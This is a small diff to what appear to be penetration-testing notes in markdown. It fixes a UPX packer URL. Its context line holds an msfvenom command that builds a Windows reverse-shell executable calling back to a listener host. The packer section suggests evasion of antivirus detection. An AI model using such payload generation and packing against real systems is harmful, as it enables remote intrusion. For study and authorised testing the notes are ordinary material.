@@ -13,7 +13,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > bina
 ## UPX
 
 * Packer for executeables
-* ` https://upx.github.io/`
+* `https://upx.github.io/`
 
 ```bash
 sudo apt install upx-ucl
